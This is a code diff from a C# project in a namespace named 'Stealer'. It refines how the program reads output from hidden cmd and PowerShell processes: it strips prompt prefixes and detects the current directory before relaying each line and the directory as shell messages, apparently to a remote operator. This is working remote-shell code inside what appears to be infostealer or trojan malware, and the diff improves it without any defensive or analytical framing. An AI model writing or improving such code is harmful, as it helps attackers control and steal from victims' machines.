@@ -198,14 +198,19 @@ namespace Stealer
             {
                 if (e.Data == null) return;
                 if (!_cmdStreaming) { if (e.Data.TrimEnd() == SHELL_DONE) _cmdReady.Set(); return; }
-                if (e.Data.StartsWith(SHELL_CWD))
+                // cmd prompt "C:\path>" may be prepended to the line (no trailing newline from prompt)
+                int cwdIdx = e.Data.IndexOf(SHELL_CWD);
+                if (cwdIdx >= 0)
                 {
-                    string cwd = e.Data.Substring(SHELL_CWD.Length).Trim();
+                    string cwd = e.Data.Substring(cwdIdx + SHELL_CWD.Length).Trim();
                     _cmdSem.Release();
                     SendShellLine("shell_done", "", "cmd", cwd);
                     return;
                 }
-                SendShellLine("shell_out", e.Data, "cmd", "");
+                // Strip cmd prompt prefix e.g. "C:\Windows>" from display output
+                string line = System.Text.RegularExpressions.Regex.Replace(e.Data, @"^[A-Za-z]:\\[^>]*>", "");
+                if (!string.IsNullOrEmpty(line))
+                    SendShellLine("shell_out", line, "cmd", "");
             };
             _cmdShell.ErrorDataReceived += (s, e) =>
             {
@@ -270,14 +275,18 @@ namespace Stealer
             {
                 if (e.Data == null) return;
                 if (!_psStreaming) { if (e.Data.TrimEnd() == SHELL_DONE) _psReady.Set(); return; }
-                if (e.Data.StartsWith(SHELL_CWD))
+                int cwdIdx = e.Data.IndexOf(SHELL_CWD);
+                if (cwdIdx >= 0)
                 {
-                    string cwd = e.Data.Substring(SHELL_CWD.Length).Trim();
+                    string cwd = e.Data.Substring(cwdIdx + SHELL_CWD.Length).Trim();
                     _psSem.Release();
                     SendShellLine("shell_done", "", "ps", cwd);
                     return;
                 }
-                SendShellLine("shell_out", e.Data, "ps", "");
+                // Strip PS prompt prefix "PS C:\path>"
+                string line = System.Text.RegularExpressions.Regex.Replace(e.Data, @"^PS [A-Za-z]:\\[^>]*>", "");
+                if (!string.IsNullOrEmpty(line))
+                    SendShellLine("shell_out", line, "ps", "");
             };
             _psShell.ErrorDataReceived += (s, e) =>
             {
